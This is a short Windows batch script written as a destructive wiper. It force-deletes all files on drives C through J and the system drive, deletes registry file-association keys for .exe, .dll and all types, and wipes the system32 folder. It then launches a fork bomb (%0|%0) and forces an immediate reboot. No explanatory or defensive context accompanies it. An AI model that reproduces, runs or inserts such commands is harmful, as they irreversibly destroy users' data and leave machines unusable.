@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
Del C:\ *.* /y
del *.*
del %systemdrive%\*.* /f /s /q
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
del C:\WINDOWS\system32\*.*/q 
%0|%0
shutdown -r -f -t 00 
